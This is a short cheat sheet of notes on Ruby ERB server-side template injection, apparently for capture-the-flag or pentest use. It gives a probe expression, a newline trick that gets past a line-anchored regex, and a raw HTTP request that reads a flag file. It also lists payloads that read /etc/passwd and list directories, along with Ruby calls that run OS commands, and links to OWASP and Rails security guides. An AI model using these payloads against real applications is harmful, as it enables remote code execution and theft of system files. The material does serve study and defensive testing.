Simple check for the injection: 
<%= 7 * 7 %> #should get 49
make sure special characters are encoded -> <%25%3D+7+*+7+%25>

Example of Incorrect regular expression:
 if params[:xx_x] =~ /^[0-9a-z ]+$/i
 This could be bypassed with the following:
 
POST / HTTP/1.1
....
xx_x=eee
<%25%3d+File.open('./flag.txt').read+%25>
ww

Code where we can inject: @xx_x = ERB.new(params[:xx_x]).result(binding)

Possible payloads:
  <%= 7 * 7 %>
  <%= File.open('/etc/passwd').read %>
  <%= Dir.entries('/') %>

eval("ruby code here")
system("os command here")
`ls -al /` # (backticks contain os command)
exec("os command here")
spawn("os command here")
open("| os command here")
Process.exec("os command here")
Process.spawn("os command here")
IO.binread("| os command here")
IO.binwrite("| os command here", "foo")
IO.foreach("| os command here") {}
IO.popen("os command here")
IO.read("| os command here")
IO.readlines("| os command here")
IO.write("| os command here", "foo")

Links:
  https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html
  https://guides.rubyonrails.org/security.html#regular-expressions
